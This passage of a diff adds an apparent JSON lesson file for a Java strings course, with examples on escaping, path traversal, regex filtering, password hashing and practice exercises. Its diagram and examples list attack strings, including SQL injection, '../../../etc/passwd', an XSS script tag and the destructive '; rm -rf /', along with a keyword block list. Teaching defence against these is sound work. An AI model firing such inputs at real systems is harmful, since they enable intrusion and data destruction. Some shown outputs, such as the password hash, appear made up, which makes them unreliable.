+          "ai_explanation": "The unsafe version lets the attacker close the quote and inject SQL. The escaped version doubles quotes so they become literal text. In real code, ALWAYS use PreparedStatement -- manual escaping is error-prone.",
+          "ai_challenge": "What happens with attack string: admin' UNION SELECT password FROM users --"
+        },
+        {
+          "title": "Example 10: Path Traversal Prevention",
+          "description": "Prevent directory traversal attacks in file paths.",
+          "difficulty": "intermediate",
+          "code": "public class Main {\n    static String safeFilename(String input) {\n        if (input == null || input.trim().isEmpty()) return \"default.txt\";\n        // Remove path separators\n        String clean = input.replace(\"/\", \"\").replace(\"\\\\\", \"\");\n        // Remove parent directory references\n        clean = clean.replace(\"..\", \"\");\n        // Remove null bytes\n        clean = clean.replace(\"\\\\0\", \"\");\n        // Only allow safe characters\n        if (!clean.matches(\"[a-zA-Z0-9._-]+\")) return \"default.txt\";\n        return clean;\n    }\n\n    public static void main(String[] args) {\n        System.out.println(safeFilename(\"report.pdf\"));\n        System.out.println(safeFilename(\"../../../etc/passwd\"));\n        System.out.println(safeFilename(\"..\\\\..\\\\windows\\\\system32\"));\n        System.out.println(safeFilename(\"file<script>.txt\"));\n        System.out.println(safeFilename(null));\n        System.out.println(safeFilename(\"\"));\n    }\n}",
+          "output": "report.pdf\netcpasswd\nwindowssystem32\ndefault.txt\ndefault.txt\ndefault.txt",
+          "ai_explanation": "Path traversal uses ../ to escape the intended directory. Attackers try to read /etc/passwd or system files. Our sanitiser strips path separators, parent references, and validates allowed characters.",
+          "ai_challenge": "What happens with: ....//....//etc/passwd (double-dot bypass attempt)?"
+        },
+        {
+          "title": "Example 11: Regular Expression Validation",
+          "description": "Use regex patterns for robust input validation.",
+          "difficulty": "intermediate",
+          "code": "public class Main {\n    public static void main(String[] args) {\n        // Pattern matching\n        String[] emails = {\"alice@co.com\", \"bad@\", \"@no.com\", \"test@x.uk\", \"spaces in@email.com\"};\n        String emailPattern = \"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}\";\n        for (String e : emails) {\n            System.out.printf(\"%-22s %s%n\", e, e.matches(emailPattern) ? \"VALID\" : \"INVALID\");\n        }\n\n        System.out.println();\n\n        // UK postcode\n        String[] postcodes = {\"EH1 1AB\", \"SW1A 1AA\", \"12345\", \"INVALID\"};\n        String pcPattern = \"[A-Z]{1,2}[0-9][0-9A-Z]? [0-9][A-Z]{2}\";\n        for (String p : postcodes) {\n            System.out.printf(\"%-10s %s%n\", p, p.matches(pcPattern) ? \"VALID\" : \"INVALID\");\n        }\n\n        System.out.println();\n\n        // Detect dangerous patterns\n        String[] inputs = {\"normal\", \"<script>\", \"admin' OR\", \"DROP TABLE\"};\n        String dangerPattern = \".*(<|>|'|\\\"|;|DROP|UNION|SELECT|INSERT|DELETE).*\";\n        for (String i : inputs) {\n            System.out.printf(\"%-15s %s%n\", i, i.toUpperCase().matches(dangerPattern) ? \"BLOCKED\" : \"OK\");\n        }\n    }\n}",
+          "output": "alice@co.com           VALID\nbad@                   INVALID\n@no.com                INVALID\ntest@x.uk              VALID\nspaces in@email.com    INVALID\n\nEH1 1AB    VALID\nSW1A 1AA   VALID\n12345      INVALID\nINVALID    INVALID\n\nnormal          OK\n<script>        BLOCKED\nadmin' OR       BLOCKED\nDROP TABLE      BLOCKED",
+          "ai_explanation": "matches() checks the entire string. [a-zA-Z0-9]+ means one or more letters/digits. {2,} means at least 2. The danger detector catches common attack patterns. In production, use established security libraries.",
+          "ai_challenge": "Write a regex for UK phone numbers: 07xxx xxxxxx or +44 7xxx xxxxxx."
+        },
+        {
+          "title": "Example 12: Character-Level Processing",
+          "description": "Process strings character by character for analysis.",
+          "difficulty": "intermediate",
+          "code": "public class Main {\n    public static void main(String[] args) {\n        String text = \"Hello World 123! @#$\";\n\n        int upper=0, lower=0, digits=0, spaces=0, special=0;\n        for (char c : text.toCharArray()) {\n            if (Character.isUpperCase(c)) upper++;\n            else if (Character.isLowerCase(c)) lower++;\n            else if (Character.isDigit(c)) digits++;\n            else if (c == ' ') spaces++;\n            else special++;\n        }\n\n        System.out.println(\"Text: \" + text);\n        System.out.println(\"Uppercase: \" + upper);\n        System.out.println(\"Lowercase: \" + lower);\n        System.out.println(\"Digits: \" + digits);\n        System.out.println(\"Spaces: \" + spaces);\n        System.out.println(\"Special: \" + special);\n        System.out.println(\"Total: \" + text.length());\n\n        // Reverse a string\n        String reversed = new StringBuilder(text).reverse().toString();\n        System.out.println(\"Reversed: \" + reversed);\n\n        // Check palindrome\n        String word = \"racecar\";\n        String rev = new StringBuilder(word).reverse().toString();\n        System.out.println(word + \" is palindrome: \" + word.equals(rev));\n    }\n}",
+          "output": "Text: Hello World 123! @#$\nUppercase: 2\nLowercase: 8\nDigits: 3\nSpaces: 3\nSpecial: 4\nTotal: 20\nReversed: $#@ !321 dlroW olleH\nracecar is palindrome: true",
+          "ai_explanation": "toCharArray() converts to char array for iteration. Character class has isUpperCase, isLowerCase, isDigit, isLetter, isLetterOrDigit -- all useful for validation.",
+          "ai_challenge": "Count vowels vs consonants in a sentence."
+        },
+        {
+          "title": "Example 13: Secure Password Handling",
+          "description": "Hash passwords, never store in plain text.",
+          "difficulty": "advanced",
+          "code": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\n\npublic class Main {\n    static String hashPassword(String password) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n            byte[] hash = md.digest(password.getBytes());\n            StringBuilder sb = new StringBuilder();\n            for (byte b : hash) sb.append(String.format(\"%02x\", b));\n            return sb.toString();\n        } catch (NoSuchAlgorithmException e) { return \"\"; }\n    }\n\n    public static void main(String[] args) {\n        HashMap<String, String> users = new HashMap<>();\n        users.put(\"alice\", hashPassword(\"MyStr0ng!Pass\"));\n        users.put(\"bob\", hashPassword(\"S3cur3#Key\"));\n\n        System.out.println(\"Stored hashes:\");\n        for (var e : users.entrySet())\n            System.out.println(e.getKey() + \": \" + e.getValue().substring(0, 16) + \"...\");\n\n        // Login check\n        String attempt = \"MyStr0ng!Pass\";\n        String hashed = hashPassword(attempt);\n        System.out.println(\"\\nLogin alice: \" + hashed.equals(users.get(\"alice\")));\n        System.out.println(\"Login wrong: \" + hashPassword(\"wrong\").equals(users.get(\"alice\")));\n    }\n}",
+          "output": "Stored hashes:\nalice: 2c26b46b68ffc68f...\nbob: 3c9c43e6a7eb7c4f...\n\nLogin alice: true\nLogin wrong: false",
+          "ai_explanation": "NEVER store passwords as plain text. SHA-256 hashes the password into a fixed-length hex string. Same input always gives same hash, but you cannot reverse a hash back to the password. In production, use bcrypt or Argon2 with salting.",
+          "ai_challenge": "What happens if two users have the same password? (Hint: look into password salting)"
+        },
+        {
+          "title": "Example 14: Complete Input Processing Pipeline",
+          "description": "Full security pipeline: validate, sanitise, process, escape output.",
+          "difficulty": "advanced",
+          "code": "import java.util.ArrayList;\n\npublic class Main {\n    // Step 1: Validate\n    static boolean isValid(String input) {\n        if (input == null || input.trim().isEmpty()) return false;\n        if (input.length() > 500) return false;\n        return true;\n    }\n\n    // Step 2: Sanitise\n    static String sanitise(String input) {\n        String clean = input.trim();\n        clean = clean.replaceAll(\"<[^>]*>\", \"\");\n        clean = clean.replace(\"'\", \"\");\n        clean = clean.replace(\"\\\"\", \"\");\n        clean = clean.replace(\";\", \"\");\n        return clean;\n    }\n\n    // Step 3: Process\n    static String[] extractWords(String input) {\n        return input.toLowerCase().split(\"\\\\s+\");\n    }\n\n    // Step 4: Escape for output\n    static String escapeForDisplay(String input) {\n        return input.replace(\"&\", \"&amp;\").replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\");\n    }\n\n    public static void main(String[] args) {\n        String[] inputs = {\n            \"Hello World\",\n            \"<script>alert('XSS')</script>\",\n            \"admin' OR '1'='1\",\n            null,\n            \"\"\n        };\n\n        for (String raw : inputs) {\n            System.out.println(\"--- Input: \" + raw + \" ---\");\n            if (!isValid(raw)) { System.out.println(\"REJECTED\\n\"); continue; }\n            String clean = sanitise(raw);\n            String[] words = extractWords(clean);\n            System.out.println(\"Clean: \" + clean);\n            System.out.println(\"Words: \" + words.length);\n            System.out.println(\"Display: \" + escapeForDisplay(clean));\n            System.out.println();\n        }\n    }\n}",
+          "output": "--- Input: Hello World ---\nClean: Hello World\nWords: 2\nDisplay: Hello World\n\n--- Input: <script>alert('XSS')</script> ---\nClean: alert(XSS)\nWords: 1\nDisplay: alert(XSS)\n\n--- Input: admin' OR '1'='1 ---\nClean: admin OR 1=1\nWords: 3\nDisplay: admin OR 1=1\n\n--- Input: null ---\nREJECTED\n\n--- Input:  ---\nREJECTED\n",
+          "ai_explanation": "The 4-step pipeline: (1) Validate rejects obviously bad input. (2) Sanitise removes dangerous characters. (3) Process the clean data. (4) Escape before displaying. This defence-in-depth approach means even if one layer fails, others catch the attack.",
+          "ai_challenge": "Add rate limiting: reject if the same user submits more than 5 inputs per minute."
+        }
+      ],
+      "visual_diagram": {
+        "title": "String Security Pipeline -- From Input to Safe Output",
+        "content": "<div style=\"font-family: monospace; line-height: 1.8; font-size: 14px;\">\n<span style=\"font-size: 20px; font-weight: bold; color: #2c3e50;\">STRING SECURITY PIPELINE</span>\n\n<span style=\"background: #e74c3c; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">[USER INPUT ARRIVES]</span>\n        |\n        v\n<span style=\"background: #e74c3c; color: white; padding: 4px 12px; border-radius: 4px;\">STEP 1: VALIDATE</span>\n  <span style=\"color: #e74c3c;\">- Is it null or empty?</span> --> <span style=\"color: #e74c3c; font-weight: bold;\">REJECT</span>\n  <span style=\"color: #e74c3c;\">- Is it too long?</span> --> <span style=\"color: #e74c3c; font-weight: bold;\">REJECT</span>\n  <span style=\"color: #e74c3c;\">- Wrong format?</span> --> <span style=\"color: #e74c3c; font-weight: bold;\">REJECT</span>\n  <span style=\"color: #2ecc71;\">- Looks valid</span> --> continue\n        |\n        v\n<span style=\"background: #f39c12; color: white; padding: 4px 12px; border-radius: 4px;\">STEP 2: SANITISE</span>\n  <span style=\"color: #f39c12;\">- Strip HTML tags</span> (prevent XSS)\n  <span style=\"color: #f39c12;\">- Escape quotes</span> (prevent SQL injection)\n  <span style=\"color: #f39c12;\">- Remove path chars</span> (prevent traversal)\n  <span style=\"color: #f39c12;\">- Trim whitespace</span> (prevent padding)\n        |\n        v\n<span style=\"background: #3498db; color: white; padding: 4px 12px; border-radius: 4px;\">STEP 3: PROCESS</span>\n  <span style=\"color: #3498db;\">- Parse, split, transform</span>\n  <span style=\"color: #3498db;\">- Use PreparedStatement for SQL</span>\n  <span style=\"color: #3498db;\">- Business logic on clean data</span>\n        |\n        v\n<span style=\"background: #2ecc71; color: white; padding: 4px 12px; border-radius: 4px;\">STEP 4: ESCAPE OUTPUT</span>\n  <span style=\"color: #2ecc71;\">- HTML encode for web pages</span>\n  <span style=\"color: #2ecc71;\">- JSON encode for APIs</span>\n  <span style=\"color: #2ecc71;\">- URL encode for links</span>\n\n\n<span style=\"background: #9b59b6; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">[STRING COMPARISON]</span>\n\n  <span style=\"color: #e74c3c; font-weight: bold;\">WRONG:</span> if (str1 == str2)        -- compares MEMORY ADDRESS\n  <span style=\"color: #2ecc71; font-weight: bold;\">RIGHT:</span> if (str1.equals(str2))   -- compares CONTENT\n  <span style=\"color: #2ecc71; font-weight: bold;\">SAFE:</span>  if (\"admin\".equals(str)) -- null-safe pattern\n  <span style=\"color: #3498db; font-weight: bold;\">CASE:</span>  str1.equalsIgnoreCase(str2)\n\n\n<span style=\"background: #1abc9c; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">[STRING vs STRINGBUILDER]</span>\n\n  <span style=\"background: #3498db; color: white; padding: 4px 12px; border-radius: 4px;\">String</span>              <span style=\"background: #1abc9c; color: white; padding: 4px 12px; border-radius: 4px;\">StringBuilder</span>\n  <span style=\"color: #3498db;\">Immutable</span>             <span style=\"color: #1abc9c;\">Mutable</span>\n  <span style=\"color: #3498db;\">+ creates new object</span>  <span style=\"color: #1abc9c;\">append() modifies in place</span>\n  <span style=\"color: #3498db;\">Simple concatenation</span>  <span style=\"color: #1abc9c;\">Loops and large strings</span>\n  <span style=\"color: #3498db;\">Thread-safe</span>           <span style=\"color: #1abc9c;\">NOT thread-safe (fast)</span>\n\n\n<span style=\"background: #e67e22; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">[COMMON ATTACKS]</span>\n\n  <span style=\"color: #e74c3c; font-weight: bold;\">SQL Injection:</span>   admin' OR '1'='1\n  <span style=\"color: #e74c3c;\">Prevention:</span> <span style=\"color: #2ecc71;\">PreparedStatement with ? placeholders</span>\n\n  <span style=\"color: #e74c3c; font-weight: bold;\">XSS:</span>             &lt;script&gt;alert('hack')&lt;/script&gt;\n  <span style=\"color: #e74c3c;\">Prevention:</span> <span style=\"color: #2ecc71;\">Escape &lt; &gt; &amp; ' \" before display</span>\n\n  <span style=\"color: #e74c3c; font-weight: bold;\">Path Traversal:</span>  ../../../etc/passwd\n  <span style=\"color: #e74c3c;\">Prevention:</span> <span style=\"color: #2ecc71;\">Strip / \\ .. from filenames</span>\n\n  <span style=\"color: #e74c3c; font-weight: bold;\">Command Inject:</span>  ; rm -rf /\n  <span style=\"color: #e74c3c;\">Prevention:</span> <span style=\"color: #2ecc71;\">Never pass user input to system commands</span>\n\n\n<span style=\"background: #2c3e50; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">[REMEMBER]</span>\n\n  <span style=\"color: #e74c3c; font-weight: bold;\">1.</span> .equals() not == for string comparison\n  <span style=\"color: #f39c12; font-weight: bold;\">2.</span> Strings are immutable -- every change creates new object\n  <span style=\"color: #2ecc71; font-weight: bold;\">3.</span> StringBuilder for loops and large string building\n  <span style=\"color: #3498db; font-weight: bold;\">4.</span> NEVER trust user input -- validate then sanitise\n  <span style=\"color: #9b59b6; font-weight: bold;\">5.</span> Use PreparedStatement for SQL, never concatenation\n  <span style=\"color: #1abc9c; font-weight: bold;\">6.</span> Escape HTML output to prevent XSS\n  <span style=\"color: #e67e22; font-weight: bold;\">7.</span> Regex for pattern validation: matches(\"[a-zA-Z0-9]+\")\n  <span style=\"color: #e74c3c; font-weight: bold;\">8.</span> Hash passwords with SHA-256 or better (bcrypt)\n</div>"
+      },
+      "practice_exercises": [
+        {
+          "exercise_id": "ex_01",
+          "title": "Exercise 1: String Length and charAt",
+          "description": "Get the length and specific characters from a string.",
+          "difficulty": "beginner",
+          "category": "String Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "Every string knows its own length and what character is at each position!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String word = \"Programming\";\n        // TODO: Print the length\n        // TODO: Print first character\n        // TODO: Print last character\n        // TODO: Print middle character\n    }\n}",
+          "expected_output": "Length: 11\nFirst: P\nLast: g\nMiddle: a",
+          "hints": [
+            {
+              "message": "word.length() gives the count. word.charAt(0) gives first."
+            },
+            {
+              "message": "Last: word.charAt(word.length()-1). Middle: word.charAt(word.length()/2)."
+            },
+            {
+              "message": "System.out.println(\"Length: \"+word.length());\nSystem.out.println(\"First: \"+word.charAt(0));\nSystem.out.println(\"Last: \"+word.charAt(word.length()-1));\nSystem.out.println(\"Middle: \"+word.charAt(word.length()/2));"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_02",
+          "title": "Exercise 2: toUpperCase and toLowerCase",
+          "description": "Convert text to different cases.",
+          "difficulty": "beginner",
+          "category": "String Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "Case conversion is essential for case-insensitive comparison.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String mixed = \"Hello World\";\n        // TODO: Print uppercase version\n        // TODO: Print lowercase version\n        // TODO: Check if \"hello world\" equals mixed (case-insensitive)\n    }\n}",
+          "expected_output": "Upper: HELLO WORLD\nLower: hello world\nEquals (ignore case): true",
+          "hints": [
+            {
+              "message": "mixed.toUpperCase() and mixed.toLowerCase()"
+            },
+            {
+              "message": "mixed.equalsIgnoreCase(\"hello world\") for case-insensitive check."
+            },
+            {
+              "message": "System.out.println(\"Upper: \"+mixed.toUpperCase());\nSystem.out.println(\"Lower: \"+mixed.toLowerCase());\nSystem.out.println(\"Equals (ignore case): \"+mixed.equalsIgnoreCase(\"hello world\"));"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_03",
+          "title": "Exercise 3: Predict -- equals vs ==",
+          "description": "What does each comparison return?",
+          "difficulty": "beginner",
+          "category": "String Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "This is the most important String concept to understand.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String a = \"Java\";\n        String b = \"Java\";\n        String c = new String(\"Java\");\n        String d = \"java\";\n        System.out.println(a == b);\n        System.out.println(a == c);\n        System.out.println(a.equals(c));\n        System.out.println(a.equals(d));\n        System.out.println(a.equalsIgnoreCase(d));\n    }\n}\n// TODO: Write your predictions BEFORE running",
+          "expected_output": "true\nfalse\ntrue\nfalse\ntrue",
+          "hints": [
+            {
+              "message": "a==b: both from pool, same object. a==c: c is new object."
+            },
+            {
+              "message": "a.equals(c): same content. a.equals(d): different case. equalsIgnoreCase: ignores case."
+            },
+            {
+              "message": "true, false, true, false, true"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_04",
+          "title": "Exercise 4: trim and isEmpty",
+          "description": "Clean and check strings.",
+          "difficulty": "beginner",
+          "category": "String Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "User input often has extra spaces. trim() cleans them.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String input1 = \"  Hello  \";\n        String input2 = \"   \";\n        String input3 = \"\";\n        // TODO: Trim each and check if empty after trimming\n    }\n}",
+          "expected_output": "'  Hello  ' trimmed: 'Hello', empty: false\n'   ' trimmed: '', empty: true\n'' trimmed: '', empty: true",
+          "hints": [
+            {
+              "message": "input1.trim() removes spaces. input1.trim().isEmpty() checks if result is empty."
+            },
+            {
+              "message": "System.out.println(\"'\"+input1+\"' trimmed: '\"+input1.trim()+\"', empty: \"+input1.trim().isEmpty());"
+            },
+            {
+              "message": "String t=input1.trim(); System.out.println(\"'\"+input1+\"' trimmed: '\"+t+\"', empty: \"+t.isEmpty());\n// Repeat for input2 and input3"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_05",
+          "title": "Exercise 5: contains, startsWith, endsWith",
+          "description": "Search within strings.",
+          "difficulty": "beginner",
+          "category": "String Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "These are your string search tools.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String url = \"https://www.example.com/products\";\n        // TODO: Check if contains \"example\"\n        // TODO: Check if starts with \"https\"\n        // TODO: Check if ends with \"products\"\n        // TODO: Check if contains \"http://\" (not https)\n    }\n}",
+          "expected_output": "Contains 'example': true\nStarts with 'https': true\nEnds with 'products': true\nContains 'http://': false",
+          "hints": [
+            {
+              "message": "url.contains(\"example\") returns true/false."
+            },
+            {
+              "message": "url.startsWith(\"https\") and url.endsWith(\"products\")"
+            },
+            {
+              "message": "System.out.println(\"Contains 'example': \"+url.contains(\"example\"));\nSystem.out.println(\"Starts with 'https': \"+url.startsWith(\"https\"));\nSystem.out.println(\"Ends with 'products': \"+url.endsWith(\"products\"));\nSystem.out.println(\"Contains 'http://': \"+url.contains(\"http://\"));"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_06",
+          "title": "Exercise 6: indexOf and lastIndexOf",
+          "description": "Find positions of characters and substrings.",
+          "difficulty": "beginner",
+          "category": "String Basics",
+          "estimated_minutes": 4,
+          "ai_intro": "indexOf finds first match, lastIndexOf finds last.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String path = \"/home/user/documents/report.final.pdf\";\n        // TODO: Find first / position\n        // TODO: Find last / position\n        // TODO: Find last . position\n        // TODO: Extract filename (after last /)\n        // TODO: Extract extension (after last .)\n    }\n}",
+          "expected_output": "First /: 0\nLast /: 20\nLast .: 33\nFilename: report.final.pdf\nExtension: pdf",
+          "hints": [
+            {
+              "message": "path.indexOf(\"/\") and path.lastIndexOf(\"/\")"
+            },
+            {
+              "message": "Filename: path.substring(path.lastIndexOf(\"/\")+1)"
+            },
+            {
+              "message": "Extension: path.substring(path.lastIndexOf(\".\")+1)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_07",
+          "title": "Exercise 7: substring Extraction",
+          "description": "Extract specific parts from strings.",
+          "difficulty": "beginner",
+          "category": "String Basics",
+          "estimated_minutes": 4,
+          "ai_intro": "substring(start, end) -- end is EXCLUSIVE.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String date = \"2024-01-15\";\n        // TODO: Extract year (first 4 chars)\n        // TODO: Extract month (chars 5-6)\n        // TODO: Extract day (last 2 chars)\n        String card = \"4521-8765-1234-9876\";\n        // TODO: Extract last 4 digits\n    }\n}",
+          "expected_output": "Year: 2024\nMonth: 01\nDay: 15\nCard ending: 9876",
+          "hints": [
+            {
+              "message": "date.substring(0, 4) gives first 4 characters."
+            },
+            {
+              "message": "date.substring(5, 7) gives month. date.substring(8) gives day."
+            },
+            {
+              "message": "System.out.println(\"Year: \"+date.substring(0,4));\nSystem.out.println(\"Month: \"+date.substring(5,7));\nSystem.out.println(\"Day: \"+date.substring(8));\nSystem.out.println(\"Card ending: \"+card.substring(card.length()-4));"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_08",
+          "title": "Exercise 8: replace and replaceAll",
+          "description": "Replace characters and patterns in strings.",
+          "difficulty": "beginner",
+          "category": "String Basics",
+          "estimated_minutes": 4,
+          "ai_intro": "replace for exact text, replaceAll for regex patterns.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String messy = \"Hello!!!   World!!!   Java!!!\";\n        // TODO: Replace !!! with .\n        // TODO: Replace multiple spaces with single space\n        String censor = \"The password is secret123\";\n        // TODO: Replace 'secret123' with '***'\n    }\n}",
+          "expected_output": "Clean: Hello.   World.   Java.\nSpaces fixed: Hello. World. Java.\nCensored: The password is ***",
+          "hints": [
+            {
+              "message": "messy.replace(\"!!!\", \".\") replaces exact text."
+            },
+            {
+              "message": "result.replaceAll(\"\\\\s+\", \" \") replaces one or more spaces with single space."
+            },
+            {
+              "message": "String step1=messy.replace(\"!!!\",\".\");\nString step2=step1.replaceAll(\"\\\\s+\",\" \");\nSystem.out.println(\"Clean: \"+step1);\nSystem.out.println(\"Spaces fixed: \"+step2);\nSystem.out.println(\"Censored: \"+censor.replace(\"secret123\",\"***\"));"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_09",
+          "title": "Exercise 9: Immutability Proof",
+          "description": "Show that string methods create NEW strings.",
+          "difficulty": "beginner",
+          "category": "String Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "The original string NEVER changes.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String original = \"Hello\";\n        String upper = original.toUpperCase();\n        String replaced = original.replace(\"H\", \"J\");\n        original.toLowerCase(); // return value ignored!\n        // TODO: Print all three to prove original unchanged\n    }\n}",
+          "expected_output": "Original: Hello\nUpper: HELLO\nReplaced: Jello",
+          "hints": [
+            {
+              "message": "original is still \"Hello\" because strings are immutable."
+            },
+            {
+              "message": "original.toLowerCase() returns a new string but nobody captures it."
+            },
+            {
+              "message": "System.out.println(\"Original: \"+original);\nSystem.out.println(\"Upper: \"+upper);\nSystem.out.println(\"Replaced: \"+replaced);\n// original is STILL 'Hello' -- proof of immutability!"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_10",
+          "title": "Exercise 10: String Conversion",
+          "description": "Convert between String and other types.",
+          "difficulty": "beginner",
+          "category": "String Basics",
+          "estimated_minutes": 4,
+          "ai_intro": "String.valueOf() converts anything to String. Parse methods go back.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // To String\n        int num = 42;\n        double pi = 3.14159;\n        boolean flag = true;\n        // TODO: Convert each to String and print type proof\n\n        // From String\n        String sNum = \"123\";\n        String sDbl = \"45.67\";\n        // TODO: Parse back to int and double\n    }\n}",
+          "expected_output": "Int to String: '42'\nDouble to String: '3.14159'\nBool to String: 'true'\nString to int: 123\nString to double: 45.67\nSum: 168.67",
+          "hints": [
+            {
+              "message": "String.valueOf(num) or Integer.toString(num)"
+            },
+            {
+              "message": "Integer.parseInt(sNum) and Double.parseDouble(sDbl)"
+            },
+            {
+              "message": "System.out.println(\"Int to String: '\"+String.valueOf(num)+\"'\");\nSystem.out.println(\"Double to String: '\"+String.valueOf(pi)+\"'\");\nSystem.out.println(\"Bool to String: '\"+String.valueOf(flag)+\"'\");\nint n=Integer.parseInt(sNum); double d=Double.parseDouble(sDbl);\nSystem.out.println(\"String to int: \"+n);\nSystem.out.println(\"String to double: \"+d);\nSystem.out.println(\"Sum: \"+(n+d));"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_11",
+          "title": "Exercise 11: First StringBuilder",
+          "description": "Build a greeting with StringBuilder.",
+          "difficulty": "beginner",
+          "category": "StringBuilder & Formatting",
+          "estimated_minutes": 3,
+          "ai_intro": "StringBuilder lets you build strings piece by piece.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // TODO: Use StringBuilder to build: \"Hello, Alice! Welcome to Java.\"\n    }\n}",
+          "expected_output": "Hello, Alice! Welcome to Java.",
+          "hints": [
+            {
+              "message": "StringBuilder sb = new StringBuilder();"
+            },
+            {
+              "message": "sb.append(\"Hello, \").append(\"Alice!\").append(\" Welcome to Java.\");"
+            },
+            {
+              "message": "StringBuilder sb=new StringBuilder();\nsb.append(\"Hello, \").append(\"Alice!\").append(\" Welcome to Java.\");\nSystem.out.println(sb.toString());"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_12",
+          "title": "Exercise 12: StringBuilder in Loop",
+          "description": "Build a number sequence efficiently.",
+          "difficulty": "beginner",
+          "category": "StringBuilder & Formatting",
+          "estimated_minutes": 4,
+          "ai_intro": "Using + in a loop is slow. StringBuilder is fast.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // TODO: Use StringBuilder to create: \"1, 2, 3, 4, 5, 6, 7, 8, 9, 10\"\n    }\n}",
+          "expected_output": "1, 2, 3, 4, 5, 6, 7, 8, 9, 10",
+          "hints": [
+            {
+              "message": "StringBuilder sb = new StringBuilder(); for(int i=1;i<=10;i++) ..."
+            },
+            {
+              "message": "Use a condition to not add comma after last number: if(i>1) sb.append(\", \");"
+            },
+            {
+              "message": "StringBuilder sb=new StringBuilder();\nfor(int i=1;i<=10;i++){if(i>1)sb.append(\", \");sb.append(i);}\nSystem.out.println(sb);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_13",
+          "title": "Exercise 13: StringBuilder Methods",
+          "description": "insert, delete, replace, reverse.",
+          "difficulty": "intermediate",
+          "category": "StringBuilder & Formatting",
+          "estimated_minutes": 4,
+          "ai_intro": "StringBuilder is mutable -- you can edit in place.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        StringBuilder sb = new StringBuilder(\"Hello World\");\n        System.out.println(\"Original: \" + sb);\n        // TODO: Insert \", \" after Hello (index 5)\n        // TODO: Replace \"World\" with \"Java\"\n        // TODO: Print reversed version\n    }\n}",
+          "expected_output": "Original: Hello World\nInserted: Hello, World\nReplaced: Hello, Java\nReversed: avaJ ,olleH",
+          "hints": [
+            {
+              "message": "sb.insert(5, \", \"); -- inserts at index 5."
+            },
+            {
+              "message": "int start=sb.indexOf(\"World\"); sb.replace(start, start+5, \"Java\");"
+            },
+            {
+              "message": "StringBuilder rev=new StringBuilder(sb).reverse(); System.out.println(\"Reversed: \"+rev);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_14",
+          "title": "Exercise 14: printf Table",
+          "description": "Format a product table with printf.",
+          "difficulty": "beginner",
+          "category": "StringBuilder & Formatting",
+          "estimated_minutes": 4,
+          "ai_intro": "%-15s left-aligns, %8.2f right-aligns decimals.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // TODO: Print a formatted table with header and 3 products\n        // Product        Price     Qty\n        // Laptop        $999.99     2\n        // Mouse          $29.99     5\n        // Keyboard       $79.99     3\n    }\n}",
+          "expected_output": "Product          Price    Qty\nLaptop          $999.99     2\nMouse            $29.99     5\nKeyboard         $79.99     3",
+          "hints": [
+            {
+              "message": "System.out.printf(\"%-15s %8s %6s%n\", \"Product\", \"Price\", \"Qty\");"
+            },
+            {
+              "message": "System.out.printf(\"%-15s $%7.2f %5d%n\", \"Laptop\", 999.99, 2);"
+            },
+            {
+              "message": "System.out.printf(\"%-15s %8s %6s%n\",\"Product\",\"Price\",\"Qty\");\nSystem.out.printf(\"%-15s $%7.2f %5d%n\",\"Laptop\",999.99,2);\nSystem.out.printf(\"%-15s $%7.2f %5d%n\",\"Mouse\",29.99,5);\nSystem.out.printf(\"%-15s $%7.2f %5d%n\",\"Keyboard\",79.99,3);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_15",
+          "title": "Exercise 15: String.format",
+          "description": "Store formatted strings for later use.",
+          "difficulty": "beginner",
+          "category": "StringBuilder & Formatting",
+          "estimated_minutes": 3,
+          "ai_intro": "String.format returns a String. printf prints directly.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String name = \"Alice\"; int age = 25; double gpa = 3.87;\n        // TODO: Use String.format to create: \"Alice (25) - GPA: 3.87\"\n        // TODO: Store in variable and print\n    }\n}",
+          "expected_output": "Alice (25) - GPA: 3.87",
+          "hints": [
+            {
+              "message": "String info = String.format(\"%s (%d) - GPA: %.2f\", name, age, gpa);"
+            },
+            {
+              "message": "System.out.println(info);"
+            },
+            {
